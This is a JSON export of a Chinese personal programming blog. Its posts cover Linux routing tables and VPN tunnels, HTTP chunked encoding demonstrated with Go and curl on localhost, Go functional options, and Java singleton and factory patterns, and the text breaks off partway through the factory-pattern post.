{"meta":{"title":"Yuren Blog","subtitle":null,"description":null,"author":"Yuren","url":"","root":"/"},"pages":[{"title":"404 Not Found","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"404.html","permalink":"/404.html","excerpt":"","text":"404 Not Found **很抱歉，您访问的页面不存在** 可能是输入地址有误或该地址已被删除"},{"title":"","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"index.html","permalink":"/index.html","excerpt":"","text":""},{"title":"关于","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"about/index.html","permalink":"/about/index.html","excerpt":"","text":"这个 正在读书&amp;&amp;热爱技术&amp;&amp;喜欢电影&amp;&amp;喜欢音乐 的人很懒，什么都没有留下"},{"title":"所有分类","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"categories/index.html","permalink":"/categories/index.html","excerpt":"","text":""},{"title":"我的友链","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"friends/index.html","permalink":"/friends/index.html","excerpt":"","text":""},{"title":"所有标签","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"tags/index.html","permalink":"/tags/index.html","excerpt":"","text":""},{"title":"三元表达式转if-else语句","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"tools/converter.html","permalink":"/tools/converter.html","excerpt":"","text":".tex { width: 100%; height:200px; overflow: 100%; border-radius: 5px; } .btn { text-align: center; width: 100%; height: 30px; font-size: 100%; background-color: rgb(100,200,255); color: rgb(255,255,255); border-radius: 5px; } 转换时的分隔符为 ? 与 : 两个符号，请确保两者不会出现在诸如字符串一类的特殊地方 转换时以小括号作为分组依据，故无法处理一对括号外侧带有无关字符的情况 若在使用中遇到什么问题或您有什么好的建议，欢迎和我交流 Translate tex = document.querySelector('#tex'); btn = document.querySelector('.btn'); rlt = document.querySelector('#rlt'); btn.onclick = ()=>{ rlt.focus(); let tmp = tex.value.split(' ').join(''); rlt.value = ''; function getSplitContent(tmp) { let balance = 0; let indexs = []; let words = []; for (let i=0; i"},{"title":"杂项","date":"2022-06-12T03:35:53.716Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"tools/index.html","permalink":"/tools/index.html","excerpt":"","text":"这是一个随心所欲的地方，不定期投放各种奇怪的东西 把三元表达式转换成if-else语句的小玩意 图灵机Demo版"}],"posts":[{"title":"【好文翻译】如何解读路由表中的信息","slug":"Interpreting-Routing-Table","date":"2022-06-11T14:48:08.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2022/06/11/Interpreting-Routing-Table/","link":"","permalink":"/2022/06/11/Interpreting-Routing-Table/","excerpt":"","text":"前言为了了解 ip route 命令显示的信息有什么含义，以及它对 Linux 收发网络包的影响，我在网络上搜索了很多文章，但是这些文章多数都仅仅是按序描述每个字段的作用，没有通过具体的例子来加深印象。偶然间，在 Diego Assencio 大大的个人网站里发现了这篇文章，拜读之后感觉收获颇丰。 这篇文章给出了两个例子，第一个例子是常见的网络访问，第二个则是在 VPN 环境下的网络访问，通过阅读这篇文章，至少对于我而言有种茅塞顿开的感觉，尤其是后面 VPN 的例子，读完后就能更好地了解容器网络或虚拟机网络的实现方式。 所以本文尝试翻译 Diego Assencio 的文章，一方面做一个初次翻译的尝试，一方面备份在这里方便未来自己的阅读，侵删。 正文这篇文章将会描述如何解读 Linux 系统中路由表的信息。所谓路由表其实就是一个包含了许多路由规则的表单，网络包会根据它的目的地址来选择使用其中的哪条规则。 为了更好地理解这篇文章描述的内容，读者必须先理解两件事情：CIDR 表示法（这东西以 &lt;network-prefix&gt;/&lt;netmask-length&gt; 的格式来声明一个 IP 地址的子网）以及最长前缀匹配算法（译者注：事实上，对 tun/tap 设备的了解也是必须的，这对于理解下文 VPN 的例子尤其重要）。如果读者目前还不了解它们，请先花一些时间来学习，然后再继续阅读本文。此外，我们接下来要描述的例子都基于 IPv4 网络，但是相关的概念对 IPv6 网络也同样适用。 在 Linux 系统上，主要有两个命令用于获取路由表信息：route 和 ip。本文将使用 ip 命令，因为它输出的内容比 route 命令更加易于解读。为了使用 ip 命令来显示操作系统中路由表的内容，请打开一个终端模拟器（terminal），然后运行下面的命令： 1ip route show 这个命令的输出取决于机器的网络配置以及实际的网络拓扑。比如让我们来考虑一个通过无线网络连接到路由器以访问外部网络的机器，机器的 IP 地址为 192.168.1.100，而路由器的地址为 192.168.1.1，那么 ip 命令的输出就有可能如下： 12default via 192.168.1.1 dev wlan0192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.100 让我们从第二行开始解读这个输出。这一行表示“任何被发往 192.168.1.0/24 这个网络的包都会以 192.168.1.100 作为源地址，然后被 wlan0 这个设备发送出去”，192.168.1.100 这个地址是 DHCP 服务端为 wlan0 设备分配的地址。而剩下的部分则可能不那么有趣：proto kernel 表示这条路由是被操作系统内核在自动配置期间创建的；而 scope link 则表示在 192.168.1.0/24 这个网络中的目标地址都仅对 wlan0 这个设备有效。 而这个输出中的第一行则表示所有网络包的默认路由（即，当没有其他路由可以被使用时，网络包将使用这一条路由）。具体含义指网络包将被 wlan0 设备发送到默认网关（译者注：通常就是指家用路由器），而这个网关的地址是 192.168.1.1。 ip 这个命令的输入非常灵活，例如可以只输入命令的一部分，然后这个输入就会被 ip 命令自动在内部进行补全。举例来说，下面所有的命令实际上都是等价的： 1234ip r sip r showip ro ship route show 接下来让我们来考虑一个更复杂的例子，当设备连接到一个虚拟专用网络（VPN）时，所有网络流量都会经过一个加密隧道（tunnel）被发送到 VPN 服务端。我们以一个 OpenVPN 的网络作为例子，在这个例子中，我们有如下设备及其 IP 地址： tun0：192.168.254.10 wlan0：192.168.1.100 路由器：192.168.1.1 OpenVPN 服务端：95.91.22.94 一个网络包在被发往目的地的途中会经历如下的流程： 1原始网络包 --&gt; tun0 -加密后的网络包-&gt; wlan0 --&gt; 路由器 --&gt; OpenVPN 服务端 -解密后的网络包-&gt; 目的地 首先，一个虚拟网络设备（通常叫做 tun0）会被创建，然后一些路由信息会被加入到路由表中，这些信息引导几乎所有的流量经过 tun0 这个设备，在这里网络包会被加密，然后最终通过 wlan0 这个网络设备被发送到 OpenVPN 的服务端。 下面是一种可能的路由表输出，这个输出来源于一个已经连接到 OpenVPN 服务端的设备（也就是 OpenVPN 的客户端）： 12345670.0.0.0/1 via 192.168.254.9 dev tun0default via 192.168.1.1 dev wlan095.91.22.94 via 192.168.1.1 dev wlan0128.0.0.0/1 via 192.168.254.9 dev tun0192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.100192.168.254.0/24 via 192.168.254.9 dev tun0192.168.254.9 dev tun0 proto kernel scope link src 192.168.254.10 直接解释这个路由表中的所有细节显得有些单调乏味，所以我们将关注这些输出中的重点部分。请注意第二行：这个设备上的默认路由并没有发生变化。然而，第一行和第四行引入了两条新的路由规则，这将完全改变游戏的规则：被发送到 0.0.0.0/1 和 128.0.0.0/1 两个网络的所有网络包都会经过 tun0 设备，并且以 192.168.254.9 作为网关的地址。 这里需要注意的是，0.0.0.0/1 和 128.0.0.0/1 分别匹配目标地址的第一个比特位为 0 和 1 的网络包。当它们一起工作时，就可以代替第二行的规则成为新的默认路由规则。因为对于任何一个网络包而言，它的目标地址的第一个比特位不是 0 就是 1，而根据最长前缀匹配算法，网络包将优先选择这两条规则（译者注：可以认为 default 路由中目标地址子网掩码的长度为 0）。因此，当 OpenVPN 进程为主机创建了这两条路由后，所有的网络包都会默认被发往 tun0 设备，而从这里开始，网络包就会被加密发送到 95.91.22.94（OpenVPN 服务端的地址）。显而易见，上面输出中的第三行描述了这部分内容：被发往 95.91.22.94 的网络包都由 wlan0 设备以 192.168.1.1 作为网关发出。 一些读者可能会好奇上面的输出中 192.168.254.9 这个地址，那么它是怎么来的呢？事实上，OpenVPN 在创建 tun0 设备时是以 point-to-point 模式创建的，这意味着这个设备在工作时就好像直接连接在另一端上（译者注：也就是不需要通过中间路由器进行转发），而这个 192.168.254.9 就是另一端的设备，它实际上就是 OpenVPN 的服务端。服务端负责创建 192.168.254.0/24 这个虚拟网络，然后从地址池中选出空闲的 IP 地址分配给那些连接到自己的主机。如上面输出的最后一行所示，192.168.254.10 就是这个路由表所在的主机被分配到的地址，而 192.168.254.9 则是服务端在这个虚拟网络中的地址。 读者可以通过运行下面的例子来更清晰地证明上面的描述： 1ip addr show dev tun0 对于我们的例子而言，这条命令的输出可以非常清晰地展示前文所述的 point-to-point 连接（注意倒数第二行）： 123421: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 100 link/none inet 192.168.254.10 peer 192.168.254.9/32 scope global tun0 valid_lft forever preferred_lft forever 说明这篇文章描述了两个路由表影响网络包收发的例子，如果读者不了解 tun/tap 设备，在阅读 VPN 部分时可能会比较吃力。 简单来说，这种设备可以由系统中的某一个进程打开，然后进程可以选择读取或写入这个设备，如果有网络包被发送到这个设备，那么进程就可以从中读取到数据，和常规的 socket 不同的是，tun 设备可以读取到 IP 层的内容，tap 设备则可以读取到链路层的内容。所以如果进程在收到网络包后将它包装在一个常规的 tcp 或 udp 包中，再经过物理网卡发送到外部网络的某台主机上，那么这台目标主机在解包后就可以看到原始的 IP 包或链路层的内容，从而好像内部的这个网络包直接到达了主机上，以此营造出源主机和目标主机在这个内部网络包层面是相互可达的假象，这种虚拟化技术被叫做 Overlay 网络，如今被广泛运用于容器或虚拟机技术中。 于是在上面 VPN 的例子中，192.168.254.0/24 实际上就是内部网络包的源地址与目的地址所属的网络，而 OpenVPN 的实际网络地址其实是 95.91.22.94，也就是说，如果没有 OpenVPN 创建的 tun 设备，主机通过正常的网络只能访问 95.91.22.94 这个地址。 其他我的大学老师曾对我说，计算机领域要研究的内容总是离不开计算、存储和网络，这句话在近期深入学习容器技术的过程中不断出现在我的脑海里。 Diego Assencio 大大的原文中让我眼前一亮的其实就是 VPN 这个例子，它也是 flannel 项目最初实现的 udp 后端的核心原理，帮助我理解了更多网络方面的有趣知识。笔者对这篇文章的出现表示衷心的感谢。","categories":[{"name":"网络","slug":"网络","permalink":"/categories/网络/"}],"tags":[]},{"title":"浅谈 Http Chunked Encoding","slug":"HTTP-Chunked-Encoding","date":"2022-05-04T11:55:52.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2022/05/04/HTTP-Chunked-Encoding/","link":"","permalink":"/2022/05/04/HTTP-Chunked-Encoding/","excerpt":"","text":"前言在 HTTP 的消息头（即请求头和响应头）中，有一个叫 Content-Length 的字段，用于表示消息体的大小。早期版本的 HTTP 通过服务端发起的断开连接来表示一个消息的结束，这种方式在多数情况下都工作的很好，但是它存在两个比较严重的问题。第一是，在没有一个表示完整消息大小的字段来帮助检查的情况下，客户端无法得知连接的断开是正常情况还是由于消息的传输发生了异常；第二是，在多个 HTTP 消息共用同一个 TCP 连接的场景下，客户端无法找到不同消息间的边界。 所以，HTTP 的规范要求 Content-Length 字段是必须被提供的（虽然实际测试时发现如果服务端没有提供，很多工具依然会将关闭连接作为默认的消息边界）。 但是，有种消息，它是没有这个字段的，取而代之地使用另一种方式来确保消息的完整性，它就是这篇文章的主角，Chunked Encoding，一种消息的传输编码（Transfer Encoding）。 Chunked Encoding 与 curl我最早了解到 Chunked Encoding 恰恰是在用 curl 来测试服务端不提供 Content-Length 会发生什么时。一般来讲，如果你使用 HTTP 的框架提供服务，那么这个消息头是会被框架来处理的。所以最简单的一种绕过框架、发送一个没有这个字段的响应的方式，就是直接使用 TCP，比如在 golang 中你可以编写这样的代码： 123456789101112131415161718192021func TCPServer() &#123; listener, err := net.Listen(\"tcp\", \"localhost:8080\") if err != nil &#123; panic(err) &#125; for &#123; conn, err := listener.Accept() if err != nil &#123; panic(err) &#125; go func() &#123; defer conn.Close() conn.Write([]byte(\"HTTP/1.1 200 OK\\r\\n\" + \"Date: Wed, 04 May 2022 12:38:41 GMT\\r\\n\" + \"Content-Type: text/plain; charset=utf-8\\r\\n\" + \"\\r\\n1234567890\")) &#125;() &#125;&#125; 代码不是很标准，因为这个程序没有读取请求而直接发送响应，不过这无伤大雅。代码主要做的事情就是发送一个没有 Content-Length 请求头字段的响应，但是在请求体里有 1234567890 这样的内容。这时如果执行它，并且使用 curl -v localhost:8080，那么在 curl 的输出中可以发现 no chunk, no close, no size. Assume close to signal end 这样的输出，这证明了我在前言中的描述。 那么，Chunked Encoding 的响应体是什么样的呢，为什么它会被 curl 区别对待？我们仍然可以用 golang 和 curl 进行测试。 golang 的 http 包本身就支持 Chunked Encoding，它的 http.ResponseWriter 接口可以被显式转换成 Flusher 接口，这个接口提供一个 Flush 方法，如果调用它，那么它会以 Chunked Encoding 方式处理发送的内容，于是我们可以编写这样的代码： 123456789101112131415161718func HTTPServer() &#123; http.HandleFunc(\"/\", func(rw http.ResponseWriter, r *http.Request) &#123; flusher, ok := rw.(http.Flusher) if !ok &#123; panic(\"can not convert rw to flusher\") &#125; for i := 0; i &lt; 5; i++ &#123; rw.Write([]byte(fmt.Sprintf(\"message #%d\\n\", i))) flusher.Flush() time.Sleep(time.Second) &#125; &#125;) if err := http.ListenAndServe(\"localhost:8080\", nil); err != nil &#123; panic(err) &#125;&#125; 这段代码试图分五次发送响应体，每次间隔一秒钟。如果我们使用 curl -v localhost:8080 ，那么会发现响应体确实如预期一般每隔一秒发送一部分，同时响应头中有 Transfer-Encoding: chunked 这样的字段表示这个响应是以 Chunked Encoding 的方式被发送的，而且这个响应也确实没有 Content-Length 这个字段。 更进一步的，如果再为 curl 加上 –raw 参数，也就是使用 curl -v --raw localhost:8080，那么就可以获取原始的响应体内容，这个命令的结果是这样的： 12345678910111213141516bmessage #0bmessage #1bmessage #2bmessage #3bmessage #40 再进一步，如果命令变成了 curl -v --raw localhost:8080 | hexdump -C ，就可以得到这样的响应体内容： 123456700000000 62 0d 0a 6d 65 73 73 61 67 65 20 23 30 0a 0d 0a |b..message #0...|00000010 62 0d 0a 6d 65 73 73 61 67 65 20 23 31 0a 0d 0a |b..message #1...|00000020 62 0d 0a 6d 65 73 73 61 67 65 20 23 32 0a 0d 0a |b..message #2...|00000030 62 0d 0a 6d 65 73 73 61 67 65 20 23 33 0a 0d 0a |b..message #3...|00000040 62 0d 0a 6d 65 73 73 61 67 65 20 23 34 0a 0d 0a |b..message #4...|00000050 30 0d 0a 0d 0a |0....|00000055 这样看来就很明显了：Chunked Encoding 发送的每一部分响应体，都会以一个 16 进制的数字作为开始，这个数字表示这部分响应体的长度，后面接 \\r\\n ，然后是具体的响应体内容，再接 \\r\\n标记这部分响应的结束（上面例子中倒数第三列的 0a 是前面 fmt.Sprintf(&quot;message #%d\\n&quot;, i) 中的 \\n，并不是 Chunked Encoding 的结构）。最终，以 0 表示整个响应的结束，由于长度为 0，那么紧随其后的只有两个 \\r\\n。 Chunked Encoding 与 Golang http 的客户端golang 对 Chunked Encoding 的支持不仅限于服务端，比如我们还是使用上面的代码作为服务端，但是编写这样的代码来作为客户端： 1234567891011121314151617181920func HTTPClient() &#123; rsp, err := http.Get(\"http://localhost:8080\") if err != nil &#123; panic(err) &#125; buf := make([]byte, 512) for &#123; len, err := rsp.Body.Read(buf) if err != nil &#123; if err == io.EOF &#123; fmt.Println(\"Done\") return &#125; panic(err) &#125; fmt.Println(len, string(buf[:len])) &#125;&#125; 那么在运行它后，会得到如下的输出（每部分同样会间隔一秒）： 123456789101111 message #011 message #111 message #211 message #311 message #4Done 通过前面的内容我们可以知道，响应体的内容是包含长度、\\r\\n、部分响应体内容的，但是如果我们直接使用 golang 的 http.Response.Body.Read 方法，就可以直接拿到响应体的有效内容部分，不需要我们自己去做一些额外的操作（比如读取长度，跳过CRLF，验证长度等等）。 Chunked Encoding 与 Golang http 的服务端现在让我们把关注点放回到服务端上，不难想象，这种不需要提前计算 Content-Length、动态持续生成内容的消息类型，在一定程度上是可以实现 Websocket 的功能的，因为常规 HTTP 的痛点就在于它是一问一答的形式，而且回答的内容在被发送前就要确定下来。事实上，如果读者熟悉 Kubernetes 的 watch 机制，就会知道它是同时支持 Chunked Encoding 和 Websocket 两种方式的。 所以我们可以编写下面这样的一个小例子来演示 Chunked Encoding 的这种能力： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869package mainimport ( \"fmt\" \"net/http\" \"sync\")// 用来线程安全地对 connections 变量使用 appendvar globalLock = &amp;sync.Mutex&#123;&#125;// 用来保存所有的 Connection 对象var connections []*Connectionfunc main() &#123; // 创建一个 Connection 对象，并将它放入 connections 切片中 http.HandleFunc(\"/watch\", func(rw http.ResponseWriter, r *http.Request) &#123; c := NewConnection(rw) globalLock.Lock() fmt.Println(\"Append one\") connections = append(connections, c) globalLock.Unlock() c.Send(\"Start Watching...\\n\") select &#123;&#125; // 避免函数退出，从而保留住连接，这会有协程泄露的问题，但是这里先不管 &#125;) // 对 connections 中的所有连接发送一条消息 http.HandleFunc(\"/send\", func(rw http.ResponseWriter, r *http.Request) &#123; msg := r.URL.Query().Get(\"msg\") for _, c := range connections &#123; fmt.Println(\"Send one\") c.Send(msg + \"\\n\") // 这里加一个回车方便观察 &#125; rw.Write([]byte(\"Done\")) &#125;) if err := http.ListenAndServe(\"localhost:8080\", nil); err != nil &#123; panic(err) &#125;&#125;// 代表一个 Chunked Encoding 连接，提供 Send 方法用于发送一部分响应体type Connection struct &#123; rw http.ResponseWriter flusher http.Flusher lock *sync.Mutex&#125;func NewConnection(rw http.ResponseWriter) *Connection &#123; flusher, ok := rw.(http.Flusher) if !ok &#123; panic(\"can not convert rw to flusher\") &#125; return &amp;Connection&#123;rw, flusher, &amp;sync.Mutex&#123;&#125;&#125;&#125;// 以 Chunked Encoding 的方式发送响应体的一部分func (c *Connection) Send(msg string) &#123; // 这里的加锁是必须的，因为下面的操作并不是原子的 // 而多协程同时写响应体会导致 Chunked Encoding 的结构乱掉，从而引发客户端异常 c.lock.Lock() defer c.lock.Unlock() c.rw.Write([]byte(msg)) c.flusher.Flush()&#125; 代码有些长，主要的功能是提供了 /watch 和 /send 两个 path，前者用于和服务端保持一个连接，并从这个连接中接受被服务端下发的内容，后者则可以传递一个 msg 的 query 参数，其内容会被广播给所有的 Chunked Encoding 连接。 运行这个程序，然后多准备几个终端窗口，均执行 curl -v localhost:8080/watch，待它们都显示 Start Watching... 消息后，再打开一个终端窗口，执行 curl localhost:8080/send\\?msg=aaaaa，就可以发现前面的所有窗口都收到了 aaaaa 这个消息。而这，其实本质上和 k8s 的 watch 机制是一样的。 上面的代码仅仅起到抛砖引玉的作用，由于 Chunked Encoding 在一定程度上提供了类似全双工通信的能力，我们完全可以基于它实现更多，比如实时消息推送、聊天室等等。 杂谈最近辞掉了公司实习生的身份，距离毕业后回去做正式员工还有大概一个多月的时间，想在这段时间内好好休息一下。由于手头的工作就只有毕业设计和毕业论文，便有了更充足的时间来兴趣驱动地学一些东西。近期在读《HTTP-The-Definitive-Guide》这本书，主要目的是更深入地了解一些 HTTP 的特性，其次也想借此锻炼一下自己的英语阅读能力。 不过我是乱序读的，目前暂定的阅读顺序是 HTTPS -&gt; Entity&amp;Encoding -&gt; Connection Management -&gt; Cookie -&gt; Cache，其他的内容就按需添加。 这篇文章就是我在阅读了 Entity &amp; Encoding 部分后，针对 http chunked encoding 这个特性的一个总结与实践。","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"},{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"Functional-Options","slug":"Functional-Options","date":"2021-04-29T16:04:32.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2021/04/30/Functional-Options/","link":"","permalink":"/2021/04/30/Functional-Options/","excerpt":"","text":"0x00 前言到了大三，学校的课设开始不限制实现的语言了，考虑到为未来打基础，于是我大部分的课设都使用 Golang 来完成，以期在实践中逐渐熟练这门简洁却高效的语言。 在使用的过程中，经常会遇见对结构体进行初始化的需求，如果只是简单的字段还好，直接通过字面量来初始化即可，然而对于一些拥有复杂结构及依赖的结构体，其初始化不论是用户友好性还是可读性上都不适合使用字面量来初始化，在 Golang 的标准库中通常采用返回结构体指针的 New 函数来实现（如 list.New，sync.NewCond），这样在函数中屏蔽了相关的实现细节，以让用户能够聚焦在简单的使用上。 然而，Golang 目前并不支持函数的重载，这导致 New 函数的特征标（signature）是写死的，函数需要什么参数，用户就只能传递什么参数来初始化相应的字段。如果想达到前文所述的易用，那么参数就不该设置得太多；但是如果想给用户足够的能力来按需设置结构体，那么参数就不该设置得太少，这使得开发者很难找到一个平衡点，来设计方便高效的参数进行初始化。 有没有什么方法，能使用同一个初始化函数，通过提供不同的参数来完成对结构体不同程度的初始化呢？ 0x01 解决方法及原理最近在逛左耳耗子老师的博客的时候偶然看到了如题所述的 Functional Options 模式，该模式非常优雅地利用闭包和可变参数等性质来解决了前文所述的问题，下面给出一个例子： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647package mainimport ( \"fmt\")type Person struct &#123; name string age int hobby string&#125;type withFunc func(*Person)func withName(name string) withFunc &#123; return func(p *Person) &#123; p.name = name &#125;&#125;func withAge(age int) withFunc &#123; return func(p *Person) &#123; p.age = age &#125;&#125;func withHobby(hobby string) withFunc &#123; return func(p *Person) &#123; p.hobby = hobby &#125;&#125;func makePerson(funcs ...withFunc) *Person &#123; ret := &amp;Person&#123;&#125; for _, f := range funcs &#123; f(ret) &#125; return ret&#125;func main() &#123; p1 := makePerson(withName(\"Yuren\")) p2 := makePerson(withName(\"Yuren\"), withAge(21)) p3 := makePerson(withName(\"Yuren\"), withAge(21), withHobby(\"Program\")) fmt.Printf(\"%+v\\n%+v\\n%+v\\n\", p1, p2, p3)&#125; 对于所谓的 New 函数，我个人比较习惯于将其命名为 make+结构体名 的形式，这里就请忽略这个非常不 Golang 的函数名，转而聚焦到函数的实现上。 可以看到，makePerson 函数本身接收一个 withFuncs 的可变参数列表，withFuncs 作为一种类型定义，其本质上是一个需要传递 Person 指针的函数。按照这种特征标，代码中的 withName，withAge 和 withHobby 的返回值都是符合 withFuncs 类型的实现，由于这三者原理上相同，这里只用 withName 来举例。 12345func withName(name string) withFunc &#123; return func(p *Person) &#123; p.name = name &#125;&#125; withName 的函数定义如上，可以看到其返回了一个 withFunc 类型的函数。该函数利用闭包将传递给外层 withName 的 name 参数绑定在其作用域内，使得 withFunc 函数返回后依然具备访问 name 变量的能力，而该函数本身做的事情就是将传递进来的 Person 指针指向的实例中的 name 字段设置为 name 变量的值。 具体的 Person 指针的传递发生在 makePerson 函数调用的时候，即 p1~p3 处，在调用时传递了需要的 with* 函数的调用，将其返回的 withFunc 类型的函数放到了 makePerson 的参数列表中。 makePerson 做的事情就是用待返回的 Person 指针来消耗可变参数列表中的 withFunc 函数，以使其内部的字段被函数初始化成闭包内保留的值。 0x2 总结本文试图通过抛出笔者平时遇到的结构体初始化的矛盾，进而通过学习给出相应的解决办法，同时阐述相关的原理。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"设计模式之单例模式","slug":"DesignPattern-Singleton","date":"2020-11-13T11:44:23.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/11/13/DesignPattern-Singleton/","link":"","permalink":"/2020/11/13/DesignPattern-Singleton/","excerpt":"","text":"0x0 前言单例模式是一个比较简单的模式，其目的在于确保某一个类只有一个实例，并且自行实例化并向整个系统提供这个实例。一般来说，对于一些创建、销毁比较昂贵的对象实例，也许使用单例模式是一个不错的选择。比如一个始终需要从键盘获取用户输入的系统，我们可以在类似 Utils 的静态类中设置一个全局唯一的Scanner类，始终用于获取用户的输入，从而避免每次创建删除同类对象产生的开销。 0x1 基本代码很多设计模式相关的教程上都将单例模式分为饿汉单例和懒汉单例，它们的基本代码如下： 123456789101112131415161718192021222324// 饿汉单例class Singleton &#123; static private Singleton instance = new Singleton(); private Singleton() &#123;&#125; public static Singleton getInstance() &#123; return instance; &#125;&#125;// 懒汉单例（线程不安全）class Singleton &#123; static private Singleton instance = null; private Singleton() &#123;&#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 可以看到，为了限制客户端对该对象的多次实例化，两者的 constructor 均被设置为 private 可见性，并对外暴露静态方法 getInstance 用于返回内部的实例。区别在于，懒汉单例应用了 lazy loading 的思想，使得 instance 的实例化延迟到 getInstance 方法真正被调用时；而饿汉单例借助了 ClassLoader 的能力，让 instance 的实例化在 Singleton 类被加载时便进行了。 0x2 懒汉单例与线程安全就像上面的注释所言，上述形式的懒汉模式并不是线程安全的，原因在于 instance == null 这句判断在并发的场景下是非常靠不住的，比如如下的代码： 123456789101112131415161718192021222324public class App &#123; public static void main(String[] args) &#123; for (int i=0; i&lt;5; i++) &#123; new Thread(() -&gt; &#123; Singleton.getInstance(); &#125;).start(); &#125; &#125;&#125;class Singleton &#123; static private Singleton instance = null; private Singleton() &#123; System.out.println(\"An instance has been created\"); &#125; public static Singleton getInstance() &#123; if (instance == null) &#123; instance = new Singleton(); &#125; return instance; &#125;&#125; 在笔者的设备上共输出了5次 An instance has been created ，也就是产生了5个不同的对象，这并不符合单例模式。 针对上述问题，可以通过 synchronized 关键字对代码进行加锁，从而在保证线程安全的条件下实现懒汉单例。","categories":[{"name":"设计模式","slug":"设计模式","permalink":"/categories/设计模式/"}],"tags":[]},{"title":"设计模式之工厂模式","slug":"DesignPattern-FactoryPattern","date":"2020-11-05T12:41:00.000Z","updated":"2022-06-12T03:35:53.716Z","comments":true,"path":"2020/11/05/DesignPattern-FactoryPattern/","link":"","permalink":"/2020/11/05/DesignPattern-FactoryPattern/","excerpt":"","text":"0x0 简单（静态）工厂模式一般来说，OOP语言中获取对象的实例都是通过 new 关键字来调用对象的 constructor，从而将实例传递给某个引用或是具体的左值。constructor 根据特征标的不同来进行重载，以达到按需构建对象的目的。 但是这里有个问题，对象的初始化工作均交给了 constructor 来完成，这使得其代码往往变得很长，同时，把一些面向某个类而不是某个实例的操作（比如对实例在其类的内部用静态字段进行计数）写在 consturctor 中也不是很优雅。 更进一步的，像 Java 的 IO 操作中采用了 Filter 模式，这使得一个具备缓冲功能的 FileReader 看起来像这样： 1Reader bufferedReader = new BufferedReader(new FileReader(new File(...))) 如果每次产生这类对象时都这样写，虽然在业务上没什么问题，但是并不利于维护。比如假设突然有了把所有的 Reader 都变成 LineNumberReader 的需求的话，就要修改所有实例的 new 部分。 简单工厂模式就可以很好地解决上述这些问题。 要实现简单工厂模式，最基本的是需要一个工厂类，对于上述的 Reader，可以得到如下工厂： 123456789class ReaderFactory &#123; // constructor 设置为 private，因为这个工厂内部只需要静态方法即可 private ReaderFactory() &#123;&#125; public static Reader createReaderForFile(String filename) throws FileNotFoundException &#123; return new BufferedReader(new FileReader(new File(filename))); &#125;&#125; 这样在要获得 Reader 时，可以写类似 Reader bufferedReader = ReaderFactory.createReaderForFile(...) 的代码，而在日后遇到需要修改为 LineNumberReader 的维护需求时，只需要修改工厂中的代码即可。 这里可以发现，由于 Reader 们都实现了Reader 这个抽象类，所以利用多态的特性，返回的实例可以是任意的子类，那么实际上可以将工厂的生产方法修改为可以根据需求返回不同子类的形式，代码如下： 123456789101112131415161718class ReaderFactory &#123; private ReaderFactory() &#123; &#125; public static Reader createReaderForFile(String filename, String readerType) throws FileNotFoundException &#123; Reader fileReader = new FileReader(new File(filename)); switch (readerType) &#123; case \"BufferedReader\": return new BufferedReader(fileReader); case \"LineNumberReader\": return new LineNumberReader(fileReader); ... default: return fileReader; &#125; &#125;&#125; 这样，在客户端调用工厂的生产方法时，通过提供第二个参数即可获得不同功能的 Reader 对象。 虽然多数设计模式的书籍或文章在阐述某个模式时都会使用 Java 作为实现语言，但设计模式本身是作用于 OOP 的理念上，所以其他语言中也都有设计模式的身影。对于简单工厂模式，Vue 在使用 rollup 打包后产生的代码（通过结合立即执行表达式IIFE和闭包），我个人认为就是它的一个实现。 所以，简单工厂模式封装了一部分类的初始化行为，并可以提供按需构建不同子类的功能。这种模式方便了客户端代码（即使用工厂的代码），使其并不需要考虑工厂的具体实现，而只是按需为工厂传递参数即可。 0x1 工厂方法模式虽然简单工厂模式方便了客户端代码，但是由于每次对功能的扩展都要修改工厂的内部代码，不但违反了“开放-封闭原则”，同时在工厂生产方法很大时，每次都要编译许多无关的代码，增大了开发的成本。 工厂方法模式就可以很好地解决上述问题。 为了举例，假设我们有一个 Pet 的接口，代码如下： 123interface Pet &#123; void say();&#125; 现在分别定义猫和狗实体类来实现该接口： 12345678910111213class Cat implements Pet &#123; @Override public void say() &#123; System.out.println(\"喵\"); &#125;&#125;class Dog implements Pet &#123; @Override public void say() &#123; System.out.println(\"汪\"); &#125;&#125; 为了按需获取 Pet 的实例，我们可以定义 PetFactory 工厂： 123456789101112131415161718192021class PetFactory &#123; private PetFactory() &#123;&#125; private static Pet DEFAULT_PET = new Pet() &#123; @Override public void say() &#123; System.out.println(\"Idk who am I\"); &#125; &#125;; public static Pet createPet(String petType) &#123; switch (petType) &#123; case \"Cat\": return new Cat(); case \"Dog\": return new Dog(); default: return DEFAULT_PET; &#125; &#125;&#125; 这就是简单工厂模式的一个实现，那么按照上面所说的问题，假设现在要新添加一个 Pet 实体，除了添加一个实现了 Pet 接口的类以外，另要修改 PetFactory.createPet 方法中的 switch。 那么同样的需求，如果用工厂方法模式来实现会是什么样呢？ 首先，需要把 PetFactory 从类转为接口： 123interface PetFactory &#123; Pet createPet();&#125; 然后针对 Cat 和 Dog 分别实现其工厂： 1234567891011121314// 